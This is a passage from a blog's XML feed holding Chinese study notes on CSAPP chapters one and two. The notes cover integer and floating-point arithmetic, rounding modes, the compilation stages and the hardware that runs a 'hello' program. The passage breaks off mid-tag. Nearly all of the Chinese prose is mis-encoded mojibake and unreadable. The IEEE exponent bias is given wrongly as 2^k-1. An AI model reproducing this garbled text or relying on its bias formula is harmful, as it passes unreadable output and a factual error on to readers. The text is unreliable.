id="æ•´æ•°è¿ç®—"><a href="#æ•´æ•°è¿ç®—" class="headerlink" title="æ•´æ•°è¿ç®—"></a>æ•´æ•°è¿ç®—</h2><h4 id="åŠ æ³•"><a href="#åŠ æ³•" class="headerlink" title="åŠ æ³•"></a>åŠ æ³•</h4><p>æ— ç¬¦å·åŠ æ³•éµå¾ªäºŒè¿›åˆ¶çš„åŠ æ³•è§„åˆ™ï¼Œä»æœ€ä½ä½ï¼ˆæœ€å³è¾¹çš„ä½ï¼‰å¼€å§‹é€ä½ç›¸åŠ ï¼Œè¿›ä½ä¼šä¼ é€’åˆ°é«˜ä½ã€‚</p><p>è¡¥ç åŠ æ³•ä»ç„¶éµå¾ªæ ‡å‡†çš„äºŒè¿›åˆ¶åŠ æ³•è§„åˆ™ï¼Œä½†ç¬¦å·ä½ä¹Ÿä¼šå‚ä¸è®¡ç®—ã€‚å½“æ‰§è¡Œè¡¥ç åŠ æ³•æ—¶ï¼Œç¬¦å·ä½ä¸å…¶ä»–ä½ä¸€èµ·ç›¸åŠ ï¼Œå¦‚æœæœ‰æº¢å‡ºï¼Œåˆ™æº¢å‡ºä¼šå½±å“ç¬¦å·ä½ã€‚</p><h4 id="ä¹˜æ³•"><a href="#ä¹˜æ³•" class="headerlink" title="ä¹˜æ³•"></a>ä¹˜æ³•</h4><p>æ— ç¬¦å·ä¹˜æ³•éµå¾ªæ ‡å‡†çš„ä¹˜æ³•è§„åˆ™ï¼Œä¹˜æ³•æœ‰ <code>x*y=(x*y) mod 2^w</code> å…¶ä¸­ <code>w</code> ä¸º <code>x </code>å’Œ <code>y</code> çš„ä½æ•°ã€‚éœ€è¦æ³¨æ„ï¼Œå› ä¸º <code>x</code> å’Œ <code>y</code> ç›¸ä¹˜å¯èƒ½å¾—åˆ°æœ€å¤§ <code>2w</code> ä½çš„æ•´æ•°ï¼Œå› æ­¤å¯èƒ½ä¼šå‘ç”Ÿæˆªæ–­ã€‚</p><p>è¡¥ç ä¹˜æ³•åŒæ ·éµå¾ªæ ‡å‡†çš„ä¹˜æ³•è§„åˆ™ï¼Œä½†ç¬¦å·ä½ä¹Ÿä¼šå‚ä¸è®¡ç®—ã€‚å¯ä»¥ç†è§£ä¸ºå…ˆåƒæ— ç¬¦å·ä¹˜æ³•ï¼Œä¹˜å‡ºæ¥æˆªæ–­ä¹‹åå†è½¬ä¸ºè¡¥ç å°±æ˜¯ç»“æœã€‚</p><h4 id="é™¤ä»¥2çš„å¹‚"><a href="#é™¤ä»¥2çš„å¹‚" class="headerlink" title="é™¤ä»¥2çš„å¹‚"></a>é™¤ä»¥2çš„å¹‚</h4><p>é™¤ä»¥ 2 çš„å¹‚é€šè¿‡å³ç§»è¿ç®—æ¥å®ç°ï¼Œæ— ç¬¦å·å’Œè¡¥ç æ•°åˆ†åˆ«ä½¿ç”¨é€»è¾‘ç§»ä½å’Œç®—æœ¯ç§»ä½æ¥å®ç°ã€‚</p><h2 id="æµ®ç‚¹æ•°"><a href="#æµ®ç‚¹æ•°" class="headerlink" title="æµ®ç‚¹æ•°"></a>æµ®ç‚¹æ•°</h2><h3 id="äºŒè¿›åˆ¶å°æ•°"><a href="#äºŒè¿›åˆ¶å°æ•°" class="headerlink" title="äºŒè¿›åˆ¶å°æ•°"></a>äºŒè¿›åˆ¶å°æ•°</h3><p>äºŒè¿›åˆ¶å°æ•°çš„è¡¨ç¤ºæ–¹æ³•å’Œåè¿›åˆ¶åŸç†ç›¸åŒï¼Œåªä¸è¿‡åè¿›åˆ¶çš„åº•æ•°ä¸º 10ï¼ŒäºŒè¿›åˆ¶çš„æƒå€¼åº•æ•°å˜æˆäº† 2ã€‚</p><h3 id="IEEE-æµ®ç‚¹è¡¨ç¤º"><a href="#IEEE-æµ®ç‚¹è¡¨ç¤º" class="headerlink" title="IEEE æµ®ç‚¹è¡¨ç¤º"></a>IEEE æµ®ç‚¹è¡¨ç¤º</h3><p>IEEEæµ®ç‚¹æ ‡å‡†ç”¨å¦‚ä¸‹çš„å…¬å¼æ¥è¡¨ç¤ºä¸€ä¸ªæ•°ï¼š</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%BA%8C%E7%AB%A0-%E4%BF%A1%E6%81%AF%E5%AD%98%E5%82%A8-%E6%80%BB%E7%BB%93/2-IEEE%E6%B5%AE%E7%82%B9%E6%95%B0%E8%A1%A8%E7%A4%BA%E6%96%B9%E6%B3%95.png"></p><ul><li>ç¬¦å·(s)ï¼š<code>1</code> è¡¨ç¤ºè´Ÿæ•°ï¼Œ<code>0</code> è¡¨ç¤ºæ­£æ•°</li><li>å°¾æ•°(M)ï¼šæ˜¯ä¸€ä¸ªäºŒè¿›åˆ¶çš„å°æ•°ï¼Œå–å€¼èŒƒå›´ä¸º <code>[1,2)</code></li><li>é˜¶ç (E)ï¼šä¸ºæµ®ç‚¹æ•°åŠ æƒã€‚</li></ul><blockquote><p>è¿™ä¸ªæ–¹æ³•å°±ç›¸å½“äºæ˜¯äºŒè¿›åˆ¶çš„ç§‘å­¦è®¡æ•°æ³•ã€‚</p></blockquote><p>æµ®ç‚¹æ•°å¯ä»¥åˆ†ä¸ºä¸‰ä¸ªå­—æ®µï¼šç¬¦å·ä½ï¼Œé˜¶ç å­—æ®µå’Œå°æ•°å­—æ®µã€‚</p><p>æˆ‘ä»¬ç»å¸¸ç”¨çš„æµ®ç‚¹æ•°æœ‰ä¸¤ç±»ï¼Œå•ç²¾åº¦æµ®ç‚¹æ•° <code>float</code> å’ŒåŒç²¾åº¦æµ®ç‚¹æ•° <code>double</code>ï¼Œ<code>float</code> ä¸º <code>32</code> ä½ï¼Œ<code>double</code> ä¸º <code>64</code> ä½ã€‚</p><ul><li>å¯¹äº <code>float</code>ï¼Œæœ€é«˜ä½è¡¨ç¤ºç¬¦å·ä½ï¼›ç¬¬ <code>2</code> åˆ°ç¬¬ <code>9</code> ä½è¡¨ç¤ºé˜¶ç ï¼Œç”¨æ¥æŒ‡ç¤ºæŒ‡æ•°ä½ï¼›ç¬¬ <code>10</code> ä½åˆ°ç¬¬ <code>32</code> ä½å‡ä¸ºå°¾æ•°</li><li>å¯¹äº <code>double</code>ï¼Œæœ€é«˜ä½è¡¨ç¤ºç¬¦å·ä½ï¼›ç¬¬ <code>2</code> åˆ°ç¬¬ <code>12</code> ä½è¡¨ç¤ºé˜¶ç ï¼Œç”¨æ¥æŒ‡ç¤ºæŒ‡æ•°ä½ï¼›ç¬¬ <code>13</code> ä½åˆ°ç¬¬ <code>64</code> ä½å‡ä¸ºå°¾æ•°</li></ul><p>æ ¹æ®é˜¶ç éƒ¨åˆ†çš„å€¼ï¼Œè¢«ç¼–ç çš„å€¼æœ‰ <code>3 </code>ä¸­è¡¨ç¤ºçš„æƒ…å†µï¼š</p><ul><li><p>è§„æ ¼åŒ–çš„å€¼ï¼šé˜¶ç ä½ä¸ä¸ºå…¨ <code>0</code> ä¹Ÿä¸ä¸ºå…¨ <code>1</code>ã€‚æ­¤æ—¶é˜¶ç å­—æ®µè¢«è§£é‡Šä¸ºä»¥åç½®å½¢å¼è¡¨ç¤ºçš„æœ‰ç¬¦å·æ•´æ•°ã€‚å¯¹åº”çš„é˜¶ç çš„å€¼æ˜¯ <code>E=e-(2^k-1)</code></p></li><li><p>éè§„æ ¼åŒ–çš„å€¼ï¼šå½“é˜¶ç ä½å…¨ä¸º <code>0</code> çš„æ—¶å€™ï¼Œè¡¨ç¤ºéè§„æ ¼åŒ–çš„å€¼ã€‚æ­¤æ—¶é˜¶ç å­—æ®µè¢«è§£é‡Šä¸ºä»¥åç½®å½¢å¼è¡¨ç¤ºçš„æœ‰ç¬¦å·æ•´æ•°ã€‚å¯¹åº”çš„é˜¶ç çš„å€¼æ˜¯ <code>E=1-(2^k-1)</code></p><p>éæ ¼å¼åŒ–æ•°å¯ä»¥ç”¨æ¥è¡¨ç¤ºéå¸¸æ¥è¿‘äº 0.0 çš„æ•°ï¼Œå®ƒæä¾›äº†ä¸€ç§é€æ¸æº¢å‡ºçš„å±æ€§ä½¿å¯èƒ½çš„æ•°å€¼å‡åŒ€çš„æ¥è¿‘äº 0.0ã€‚</p></li><li><p>ç‰¹æ®Šå€¼ï¼šåŒ…æ‹¬ <code>INF</code> å’Œ <code>NAN</code>ï¼Œé˜¶ç ä½å…¨ä¸º <code>1</code> çš„æ—¶å€™ï¼Œè‹¥å°¾æ•°å…¨ä¸º0ï¼Œåˆ™å¾—åˆ° <code>INF</code>ï¼Œè‹¥ä¸å…¨ä¸º <code>0</code> åˆ™å¾—åˆ° <code>NAN</code>ã€‚</p></li></ul><h4 id="èˆå…¥"><a href="#èˆå…¥" class="headerlink" title="èˆå…¥"></a>èˆå…¥</h4><p>å› ä¸ºæµ®ç‚¹æ•°çš„è¡¨ç¤ºæ–¹æ³•é™åˆ¶äº†æµ®ç‚¹æ•°çš„èŒƒå›´å’Œç²¾åº¦ï¼Œå¤šä»¥æˆ‘ä»¬éœ€è¦åˆ©ç”¨ç‰¹å®šçš„ç³»ç»Ÿçš„æ–¹æ³•ä½¿å­˜å‚¨çš„æ•°æ®æ— é™æ¥è¿‘äºå®é™…çš„æ•°å­—ï¼Œè¿™å°±æ˜¯èˆå…¥çš„å·¥ä½œã€‚</p><p>æ€»å…±æœ‰å››ç§èˆå…¥çš„æ–¹æ³•ï¼Œä¸‹è¡¨ä¸ºåŸç†ç¤ºä¾‹ï¼š</p><table><thead><tr><th align="center">æ–¹å¼</th><th align="center">1.40</th><th align="center">1.60</th><th align="center">1.50</th><th align="center">2.50</th><th align="center">-1.50</th></tr></thead><tbody><tr><td align="center">å‘å¶æ•°èˆå…¥</td><td align="center">1</td><td align="center">2</td><td align="center">2</td><td align="center">2</td><td align="center">-2</td></tr><tr><td align="center">å‘é›¶èˆå…¥</td><td align="center">1</td><td align="center">1</td><td align="center">1</td><td align="center">2</td><td align="center">-1</td></tr><tr><td align="center">å‘ä¸‹èˆå…¥</td><td align="center">1</td><td align="center">1</td><td align="center">1</td><td align="center">2</td><td align="center">-2</td></tr><tr><td align="center">å‘ä¸Šèˆå…¥</td><td align="center">2</td><td align="center">2</td><td align="center">2</td><td align="center">3</td><td align="center">-1</td></tr></tbody></table><blockquote><p>å…¶ä¸­ï¼Œå‘å¶æ•°èˆå…¥ä¹Ÿå°±æ˜¯å‘æœ€è¿‘çš„å€¼èˆå…¥ï¼Œå…¶ä»–çš„æ–¹æ³•åŸç†å‡å’Œå­—é¢å«ä¹‰ç›¸åŒ</p></blockquote><h4 id="æµ®ç‚¹è¿ç®—"><a href="#æµ®ç‚¹è¿ç®—" class="headerlink" title="æµ®ç‚¹è¿ç®—"></a>æµ®ç‚¹è¿ç®—</h4><p>æµ®ç‚¹æ•°çš„åŠ æ³•å’Œå‡æ³•éµå¾ªä¸€èˆ¬çš„äºŒè¿›åˆ¶åŠ æ³•å’Œå‡æ³•è§„åˆ™ï¼Œä½†éœ€è¦é¢å¤–è€ƒè™‘æŒ‡æ•°éƒ¨åˆ†çš„å¯¹é½ã€‚</p><p>æµ®ç‚¹æ•°çš„ä¹˜æ³•å’Œé™¤æ³•ä¹Ÿéµå¾ªä¸€èˆ¬çš„äºŒè¿›åˆ¶ä¹˜æ³•å’Œé™¤æ³•è§„åˆ™ï¼Œä½†éœ€è¦é¢å¤–çš„å¤„ç†æ¥æ­£ç¡®å¤„ç†æŒ‡æ•°å’Œå°¾æ•°ã€‚å…·ä½“æ¥è¯´ï¼Œä¹˜æ³•æ—¶å°†æŒ‡æ•°ç›¸åŠ ï¼Œå°¾æ•°ç›¸ä¹˜ï¼Œç„¶åå¯¹ç»“æœè¿›è¡Œè§„èŒƒåŒ–ã€‚é™¤æ³•æ—¶å°†æŒ‡æ•°ç›¸å‡ï¼Œå°¾æ•°ç›¸é™¤ï¼Œç„¶åå¯¹ç»“æœè¿›è¡Œè§„èŒƒåŒ–ã€‚</p><hr><p>å¼€å­¦å–½ğŸ¥²</p>]]></content>
    
    
    <categories>
      
      <category>è¯»ä¹¦ç¬”è®°</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Knowledge</tag>
      
      <tag>CSAPP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CSAPP ç¬¬ä¸€ç«  è®¡ç®—æœºç³»ç»Ÿæ¼«æ¸¸ æ€»ç»“</title>
    <link href="/2023/08/31/CSAPP-%E7%AC%AC%E4%B8%80%E7%AB%A0-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E6%BC%AB%E6%B8%B8-%E6%80%BB%E7%BB%93/"/>
    <url>/2023/08/31/CSAPP-%E7%AC%AC%E4%B8%80%E7%AB%A0-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E6%BC%AB%E6%B8%B8-%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<p>ç¬¬ä¸€ç« æ˜¯æ€»è®ºï¼ŒæŠŠä¸€ä¸‹ç®€å•çš„æ¦‚å¿µæ¢³ç†äº†ä¸€ä¸‹</p><span id="more"></span><h1 id="ç¨‹åºçš„ç¼–è¯‘"><a href="#ç¨‹åºçš„ç¼–è¯‘" class="headerlink" title="ç¨‹åºçš„ç¼–è¯‘"></a>ç¨‹åºçš„ç¼–è¯‘</h1><p>å¸¦æœ‰ <code>.c</code> åç¼€çš„Cè¯­è¨€æºæ–‡ä»¶æ˜¯ä¸èƒ½ç›´æ¥åœ¨ç¨‹åºä¸Šè¿è¡Œçš„ï¼Œéœ€è¦å°†å…¶ä¸­çš„Cè¯­å¥è½¬æ¢ä¸ºæœºå™¨è¯­è¨€ï¼ŒæŒ‰ç…§<strong>å¯æ‰§è¡Œç›®æ ‡ç¨‹åº</strong>çš„æ ¼å¼æ‰“å¥½åŒ…ï¼Œå¹¶ä»¥äºŒè¿›åˆ¶ç£ç›˜æ–‡ä»¶çš„å½¢å¼å­˜æ”¾èµ·æ¥ã€‚ç›®æ ‡ç¨‹åºä¹Ÿç§°ä¸º<strong>å¯æ‰§è¡Œç›®æ ‡æ–‡ä»¶ã€‚</strong></p><p>æˆ‘ä»¬å¸¸ä½¿ç”¨çš„ç¼–è¯‘å‘½ä»¤ <code>gcc -o hello hello.c</code> ï¼Œå…·ä½“çš„ç¼–è¯‘è¿‡ç¨‹åˆ†ä¸ºå››ä¸ªé˜¶æ®µï¼š(1) é¢„å¤„ç†ï¼›(2) ç¼–è¯‘ï¼›(3) æ±‡ç¼–ï¼›(4) é“¾æ¥ï¼›</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%B8%80%E7%AB%A0-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E6%BC%AB%E6%B8%B8-%E6%80%BB%E7%BB%93/1-%E7%BC%96%E8%AF%91%E8%BF%87%E7%A8%8B.png"></p><h3 id="01-é¢„å¤„ç†"><a href="#01-é¢„å¤„ç†" class="headerlink" title="01 é¢„å¤„ç†"></a>01 é¢„å¤„ç†</h3><p>é¢„å¤„ç†å™¨å°†æ ¹æ®å°†è¯»å–æ‰€æœ‰çš„ <code>#include</code> å¤´æ–‡ä»¶ä»¥åŠå®å®šä¹‰ï¼ŒæŠŠä»–ä»¬æ’å…¥æ–‡æœ¬ä¸­ï¼Œå°†åŸæœ¬çš„å‘½ä»¤æ›¿æ¢æˆå…¶å…·ä½“è¯¦ç»†çš„å†…å®¹ã€‚</p><p>å¤„ç†ç»“æœæ˜¯å¾—åˆ° <code>.i</code> æ–‡æœ¬æ–‡ä»¶</p><h3 id="02-ç¼–è¯‘"><a href="#02-ç¼–è¯‘" class="headerlink" title="02 ç¼–è¯‘"></a>02 ç¼–è¯‘</h3><p>ç¼–è¯‘å™¨å°† <code>.i</code> æ–‡ä»¶è½¬æ¢ä¸º <code>.s</code> æ–‡ä»¶ï¼Œå…¶ä»£ç æŒ‡ä»¤ç”±Cè¯­è¨€ä»£ç è½¬ä¸ºæ±‡ç¼–æŒ‡ä»¤ã€‚æ–‡ä»¶ä¸­åŒ…å«å‡½æ•° main çš„å®šä¹‰ï¼Œç±»ä¼¼ä¸‹å›¾ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs assembly">main:<br>pushq %rbp<br>movq %rsp ,%rbp<br>leaq .LC0 ,%rdi<br>call puts@PLT<br>movl $0 ,%eax<br>popq %rbp<br>ret<br></code></pre></td></tr></table></figure><h3 id="03-æ±‡ç¼–"><a href="#03-æ±‡ç¼–" class="headerlink" title="03 æ±‡ç¼–"></a>03 æ±‡ç¼–</h3><p>æ±‡ç¼–å™¨å°† <code>.s</code> æ–‡ä»¶çš„äººç±»å¯è¯»çš„æ–‡æœ¬æŒ‡ä»¤è½¬æ¢ä¸ºè®¡ç®—æœºå¯è¯»çš„äºŒè¿›åˆ¶æœºå™¨è¯­è¨€æŒ‡ä»¤ï¼ŒæŠŠè¿™äº›æŒ‡ä»¤æ‰“åŒ…æˆä¸€ç§å«åš<strong>å¯é‡å®šä½ç›®æ ‡ç¨‹åº</strong>ï¼ˆrelocatable object programï¼‰çš„æ ¼å¼ï¼Œå¹¶å°†ç»“æœä¿å­˜åœ¨ <code>.o</code> æ–‡ä»¶ä¸­ã€‚</p><p>æ­¤æ—¶çš„æ–‡ä»¶ç”¨æ–‡æœ¬ç¼–è¾‘å™¨æ‰“å¼€çš„è¯å†…å®¹å°†æ˜¯ä¹±ç ã€‚</p><h3 id="04-é“¾æ¥"><a href="#04-é“¾æ¥" class="headerlink" title="04 é“¾æ¥"></a>04 é“¾æ¥</h3><p>é“¾æ¥å™¨ .o ç›®æ ‡æ–‡ä»¶ä¸å…¶ä»–ç›®æ ‡æ–‡ä»¶ã€åº“æ–‡ä»¶ã€å¯åŠ¨æ–‡ä»¶ç­‰é“¾æ¥èµ·æ¥<strong>ç”Ÿæˆå¯æ‰§è¡Œç›®æ ‡æ–‡ä»¶</strong>ã€‚</p><p>ä¾‹å¦‚æˆ‘ä»¬åœ¨ç¨‹åºä¸­è°ƒç”¨ printf å‡½æ•°ï¼Œprintf å‡½æ•°å­˜åœ¨äºä¸€ä¸ªåä¸º printf.o çš„å•ç‹¬çš„é¢„ç¼–è¯‘å¥½äº†çš„ç›®æ ‡æ–‡ä»¶ä¸­ï¼Œè€Œè¿™ä¸ªæ–‡ä»¶å¿…é¡»ç”±é“¾æ¥å™¨åˆå¹¶åˆ°æˆ‘ä»¬çš„ hello.o ç¨‹åºä¸­ã€‚</p><h1 id="ç³»ç»Ÿçš„ç¡¬ä»¶ç»„æˆ"><a href="#ç³»ç»Ÿçš„ç¡¬ä»¶ç»„æˆ" class="headerlink" title="ç³»ç»Ÿçš„ç¡¬ä»¶ç»„æˆ"></a>ç³»ç»Ÿçš„ç¡¬ä»¶ç»„æˆ</h1><p>ç³»ç»Ÿç¡¬ä»¶ç”±å››éƒ¨åˆ†ç»„æˆï¼šæ€»çº¿ã€I&#x2F;Oè®¾å¤‡ã€ä¸»å­˜å’Œå¤„ç†å™¨</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%B8%80%E7%AB%A0-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E6%BC%AB%E6%B8%B8-%E6%80%BB%E7%BB%93/1-%E7%A1%AC%E4%BB%B6%E7%BB%84%E6%88%90.png"></p><h3 id="æ€»çº¿"><a href="#æ€»çº¿" class="headerlink" title="æ€»çº¿"></a>æ€»çº¿</h3><p>æ€»çº¿å°±æ˜¯è´¯ç©¿æ•´ä¸ªç³»ç»Ÿçš„ç”µå­ç®¡é“ï¼Œè´Ÿè´£åœ¨å„ä¸ªéƒ¨ä»¶ä¹‹é—´ä¼ é€’ä¿¡æ¯ã€‚</p><p>é€šå¸¸æ€»çº¿è¢«è®¾è®¡æˆä¼ é€å®šé•¿çš„å­—èŠ‚å—ï¼Œä¹Ÿå°±æ˜¯è®¡ç®—æœºå¤„ç†æ•°æ®çš„åŸºæœ¬å•å…ƒå¤§å°<strong>å­—ï¼ˆwordï¼‰</strong>ã€‚ä¸åŒç³»ç»Ÿä¸­çš„æœºå™¨å­—é•¿ä¸åŒï¼Œå¤§éƒ¨åˆ†æ˜¯ 4 å­—èŠ‚ï¼ˆ32ä½ï¼‰å’Œ 8 å­—èŠ‚ï¼ˆ64ä½ï¼‰ã€‚</p><h3 id="I-x2F-O-è®¾å¤‡"><a href="#I-x2F-O-è®¾å¤‡" class="headerlink" title="I&#x2F;O è®¾å¤‡"></a>I&#x2F;O è®¾å¤‡</h3><p>I&#x2F;Oï¼ˆè¾“å…¥&#x2F;è¾“å‡ºï¼‰è®¾å¤‡å°±æ˜¯ç³»ç»Ÿä¸å¤–ç•Œè”ç³»çš„é€šé“ã€‚åƒé”®ç›˜é¼ æ ‡ï¼Œä»¥åŠç£ç›˜é©±åŠ¨å™¨ã€ç½‘ç»œé©±åŠ¨å™¨ä¹‹ç±»çš„ç¡¬ä»¶éƒ½æ˜¯ I&#x2F;O è®¾å¤‡ã€‚</p><p>æ¯ä¸ª I&#x2F;O è®¾å¤‡éƒ½é€šè¿‡ä¸€ä¸ª<strong>æ§åˆ¶å™¨</strong>æˆ–<strong>é€‚é…å™¨</strong>ä¸ I&#x2F;O æ€»çº¿ç›¸è¿ï¼Œè´Ÿè´£åœ¨äºŒè€…ä¹‹é—´ä¼ é€’ä¿¡æ¯ã€‚</p><blockquote><p>æ§åˆ¶å™¨æ˜¯ I&#x2F;O è®¾å¤‡æœ¬èº«æˆ–è€…ç³»ç»Ÿçš„ä¸»å°åˆ¶ç”µè·¯æ¿ï¼ˆä¸»æ¿ï¼‰ä¸Šçš„èŠ¯ç‰‡ç»„</p><p>é€‚é…å™¨æ˜¯ä¸€å—æ’åœ¨ä¸»æ¿æ’æ§½ä¸Šçš„å¡</p></blockquote><h3 id="ä¸»å­˜"><a href="#ä¸»å­˜" class="headerlink" title="ä¸»å­˜"></a>ä¸»å­˜</h3><p>ä»ç‰©ç†ä¸Šæ¥è¯´ï¼Œä¸»å­˜æ˜¯ç”±ä¸€ç»„<strong>åŠ¨æ€éšæœºå­˜å–å­˜å‚¨å™¨</strong>ï¼ˆDRAMï¼‰èŠ¯ç‰‡ç»„æˆçš„ã€‚ä»é€»è¾‘ä¸Šæ¥è¯´ï¼Œå­˜å‚¨å™¨æ˜¯ä¸€ä¸ªçº¿æ€§çš„å­—èŠ‚æ•°ç»„ï¼Œæ¯ä¸ªå­—èŠ‚éƒ½æœ‰å…¶å”¯ä¸€çš„åœ°å€ï¼ˆæ•°ç»„ç´¢å¼•ï¼‰ï¼Œè¿™äº›åœ°å€æ˜¯ä»é›¶å¼€å§‹çš„ã€‚</p><blockquote><p>ä¸»å­˜ä¹Ÿå°±æ˜¯æˆ‘ä»¬ä¼šåœ¨è´­ä¹°ç”µè„‘æ—¶åœ¨è¯¦æƒ…é¡µä¸­çœ‹åˆ°çš„â€œè¿è¡Œå†…å­˜â€ï¼Œä»£è¡¨ç¨‹åºå¯ä»¥åŒæ—¶è¿è¡Œçš„ç¨‹åºå’Œæ•°æ®å¤§å°</p></blockquote><h3 id="å¤„ç†å™¨"><a href="#å¤„ç†å™¨" class="headerlink" title="å¤„ç†å™¨"></a>å¤„ç†å™¨</h3><p><strong>ä¸­å¤®å¤„ç†å•å…ƒ</strong>ï¼ˆCPUï¼‰ï¼Œç®€ç§°<strong>å¤„ç†å™¨</strong>ï¼Œæ˜¯è§£é‡Šï¼ˆæˆ–æ‰§è¡Œï¼‰å­˜å‚¨åœ¨ä¸»å­˜ä¸­æŒ‡ä»¤çš„å¼•æ“ã€‚å¤„ç†å™¨çš„æ ¸å¿ƒæ˜¯ä¸€ä¸ªå¤§å°ä¸ºä¸€ä¸ªå­—çš„å­˜å‚¨è®¾å¤‡ï¼ˆæˆ–<strong>å¯„å­˜å™¨</strong>ï¼‰ï¼Œç§°ä¸º<strong>ç¨‹åºè®¡æ•°å™¨</strong>ï¼ˆPCï¼‰ã€‚</p><p>åœ¨ä»»ä½•æ—¶åˆ»ï¼ŒPC éƒ½æŒ‡å‘ä¸»å­˜ä¸­çš„æŸæ¡æœºå™¨è¯­è¨€æŒ‡ä»¤ï¼ˆå³å«æœ‰è¯¥æ¡æŒ‡ä»¤çš„åœ°å€ï¼‰ã€‚</p><blockquote><p>æ­¤ PC é â€œä¸ªäººè®¡ç®—æœºâ€ PC å“¦</p></blockquote><p>ä»ç³»ç»Ÿé€šç”µå¼€å§‹ï¼Œç›´åˆ°ç³»ç»Ÿæ–­ç”µï¼Œå¤„ç†å™¨ä¸€ç›´åœ¨ä¸æ–­åœ°æ‰§è¡Œç¨‹åºè®¡æ•°å™¨æŒ‡å‘çš„æŒ‡ä»¤ï¼Œå†æ›´æ–°ç¨‹åºè®¡æ•°å™¨ï¼Œä½¿å…¶æŒ‡å‘ä¸‹ä¸€æ¡æŒ‡ä»¤ï¼Œä¸æ–­å¾ªç¯å¾€å¤ã€‚è¿™ä¸ªè¿‡ç¨‹å›´ç»•ç€ä¸»å­˜ã€<strong>å¯„å­˜å™¨æ–‡ä»¶</strong>ï¼ˆregister fileï¼‰å’Œ<strong>ç®—æœ¯&#x2F;é€»è¾‘å•å…ƒ</strong>ï¼ˆALUï¼‰è¿›è¡Œã€‚</p><h3 id="è¿è¡Œä¸€ä¸ªç¨‹åº"><a href="#è¿è¡Œä¸€ä¸ªç¨‹åº" class="headerlink" title="è¿è¡Œä¸€ä¸ªç¨‹åº"></a>è¿è¡Œä¸€ä¸ªç¨‹åº</h3><p>å‡è®¾æˆ‘ä»¬ç›®æ ‡è¿è¡Œçš„ç¨‹åºå°†è¾“å‡º â€œhello worldï¼â€ï¼Œæˆ‘ä»¬åœ¨å‘½ä»¤è¡Œè§£é‡Šå™¨shellä¸­ç›´æ¥è¾“å…¥æ–‡ä»¶åï¼Œç³»ç»Ÿå°±ä¼šæ‰§è¡Œæ–‡ä»¶å¹¶ä½œå‡ºç›¸åº”çš„è¾“å‡ºã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">linux&gt; </span><span class="language-bash">./hello</span><br>hello worldï¼<br></code></pre></td></tr></table></figure><p>åœ¨è®¡ç®—æœºå±‚é¢ï¼Œè¿è¡Œç¨‹åºå°±æ˜¯ä¸æ–­å¤åˆ¶çš„ä¸€ä¸ªè¿‡ç¨‹ï¼Œå¤§è‡´åˆ†ä¸ºä»¥ä¸‹å‡ ä¸ªæµç¨‹ï¼š</p><p>é¦–å…ˆæˆ‘ä»¬åœ¨é”®ç›˜ä¸Šè¾“å…¥å­—ç¬¦ä¸² <code>â€./helloâ€œ</code> ï¼Œshell ä¼šå°†å…¶å­—ç¬¦é€ä¸€è¯»å…¥å¯„å­˜å™¨ï¼Œå†æŠŠä»–ä»¬æ”¾å…¥å†…å­˜ä¸­ã€‚</p><p>![](&#x2F;img&#x2F;CSAPP-ç¬¬ä¸€ç« -è®¡ç®—æœºç³»ç»Ÿæ¼«æ¸¸-æ€»ç»“&#x2F;1-read hello from keyboard.png)</p><p>æ•²å‡»å›è½¦é”®ä»¥åï¼Œshell å°±ä¼šæ‰§è¡Œä¸€ç³»åˆ—æŒ‡ä»¤æ¥åŠ è½½å¯æ‰§è¡Œçš„ hello æ–‡ä»¶ï¼Œè¿™äº›æŒ‡ä»¤å°†ä¼šæŠŠç›®æ ‡æ–‡ä»¶ä¸­çš„ä»£ç å’Œæ•°æ®å¤åˆ¶åˆ°ä¸»å­˜ã€‚</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%B8%80%E7%AB%A0-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E6%BC%AB%E6%B8%B8-%E6%80%BB%E7%BB%93/1-%E4%BB%8E%E7%A3%81%E7%9B%98%E5%8A%A0%E8%BD%BD%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6%E5%88%B0%E4%B8%BB%E5%AD%98.png"></p><p>æ¥ä¸‹æ¥ï¼ŒCPUå°±ä¼šå¼€å§‹å¤„ç† ç›®æ ‡ç¨‹åºçš„ main ç¨‹åºä¸­çš„æœºå™¨è¯­è¨€æŒ‡ä»¤ã€‚è¿™äº›æŒ‡ä»¤å°†ä¼šæŠŠå°†è¦è¾“å‡ºçš„å­—ç¬¦ä¸²ä¸­çš„å­—èŠ‚ä»ä¸»å­˜å¤åˆ¶åˆ°å¯„å­˜å™¨æ–‡ä»¶ï¼Œå†ä»å¯„å­˜å™¨å¤åˆ¶åˆ°æ˜¾ç¤ºè®¾å¤‡ï¼Œæœ€ç»ˆæ˜¾ç¤ºåˆ°å±å¹•ä¸Šã€‚</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%B8%80%E7%AB%A0-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E6%BC%AB%E6%B8%B8-%E6%80%BB%E7%BB%93/1-%E5%B0%86%E8%BE%93%E5%87%BA%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%BB%8E%E5%AD%98%E5%82%A8%E5%99%A8%E5%86%99%E5%88%B0%E6%98%BE%E7%A4%BA%E5%99%A8.png"></p><h1 id="æ“ä½œç³»ç»Ÿ"><a href="#æ“ä½œç³»ç»Ÿ" class="headerlink" 